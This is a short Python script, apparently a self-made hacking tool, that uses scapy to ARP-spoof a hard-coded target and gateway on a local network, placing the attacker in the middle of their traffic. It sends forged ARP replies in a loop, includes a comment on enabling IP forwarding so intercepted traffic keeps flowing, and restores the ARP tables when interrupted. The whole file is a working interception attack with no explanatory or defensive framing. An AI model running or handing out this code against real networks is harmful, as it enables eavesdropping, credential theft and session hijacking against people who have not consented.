import scapy.all as scapy
import time

def get_mac(target_ip):
    arp_request=scapy.ARP(pdst=target_ip)
    broadcast=scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast=broadcast/arp_request
    answered_list=scapy.srp(arp_request_broadcast,timeout=1,verbose=False)[0]
    return answered_list[0][1].hwsrc
    


def restore(dest_ip,source_ip):
    dest_mac=get_mac(dest_ip)
    src_mac=get_mac(source_ip)
    packet=scapy.ARP(op=2,pdst=dest_ip,hwdst=dest_mac,psrc=source_ip,hwsrc=src_mac)
    scapy.send(packet,count=4,verbose=False)

def spoof(target_ip,spoof_ip):
    target_mac=get_mac(target_ip)
    packet=scapy.ARP(op=2,pdst=target_ip,hwdst=target_mac,psrc=spoof_ip)
    scapy.send(packet, verbose=False)
    # print(packet.summary())

# "redirect ip
#  echo 1 >/proc/sys/net/ipv4/ip_forward
# "

send_packet_count=0

target_ip="192.168.153.168"
gatway_ip="192.168.153.178"

try:  
    while True :
        spoof(target_ip,gatway_ip)
        spoof(gatway_ip,target_ip)
        send_packet_count+=2
        print(f" \r [+] send packets {send_packet_count}", end="")
        time.sleep(2)

except KeyboardInterrupt :
    restore(target_ip,gatway_ip)
    restore(gatway_ip,target_ip)
    print(f"\n [+] Detected CTRL + C Qutting  restord arp_table ") 